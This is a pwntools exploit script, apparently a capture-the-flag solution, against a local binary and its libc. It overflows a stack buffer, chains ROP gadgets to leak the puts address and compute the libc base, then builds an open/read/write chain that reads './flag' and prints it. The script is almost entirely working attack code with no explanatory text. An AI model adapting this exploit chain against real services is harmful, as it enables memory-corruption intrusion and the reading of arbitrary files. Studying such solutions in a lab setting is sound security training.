from pwn import*
p = process("./pwn")
libc = ELF("./libc.so.6")
main = 0x40132b
vuln = 0x40125d
rdi = 0x4013d3
ret = 0x40101a
puts_plt = 0x4010b0
puts_got = 0x404018
str_2a = 0x402008
flag = 0x404090
p.send(b'a'*0x58 + p64(vuln))
rop = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.send(b'b'*0x28 + rop + b'a'*0x1b8)
rop = p64(rdi) + p64(str_2a) + p64(puts_plt) + p64(vuln)
# gdb.attach(p)
for i in range(0xc2):
    p.send(b'b'*0x28 + rop + b'a'*0x1b8)

p.recvline()
puts_got = u64(p.recv(6).ljust(8,b'\0'))
libc_base = puts_got - libc.symbols["puts"]
print(hex(libc_base))
system = libc_base + libc.symbols["system"]
str_bin_sh = libc_base + libc.search(b"/bin/sh").__next__()
rsi = libc_base + 0x2be51
rdx_r12 = libc_base + 0x11f2e7
open = libc_base + libc.symbols["open"]
read = libc_base + libc.symbols["read"]
write = libc_base + libc.symbols["write"]
rop = p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(6) + p64(0) + p64(read) + p64(vuln)
p.send(b'b'*0x28 + rop + b'a'*0x190)
p.send("./flag")
rop = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0) + p64(0) + p64(open)
rop+= p64(rdi) + p64(3) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(0x40) + p64(0) + p64(read)
rop+= p64(rdi) + p64(1) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(0x2000) + p64(0) + p64(write)
gdb.attach(p)
p.send(b'b'*0x28 + rop)
p.interactive()
